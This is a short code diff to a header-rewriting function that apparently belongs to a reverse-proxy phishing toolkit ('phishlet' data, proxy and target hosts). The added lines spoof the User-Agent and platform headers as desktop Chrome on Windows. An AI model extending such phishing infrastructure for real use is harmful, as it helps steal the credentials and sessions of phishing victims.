@@ -12,6 +12,11 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
         # It's already a regular dict
         headers_dict = headers.copy()
     
+
+    #  chnage value of User-Agent
+    if "User-Agent" in headers_dict:
+        headers_dict['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
+        headers_dict['Sec-Ch-Ua-Platform'] = "Windows"
     # Check and modify Accept-Encoding header to remove zstd if present
     if 'Accept-Encoding' in headers_dict:
         accept_encoding = headers_dict['Accept-Encoding']
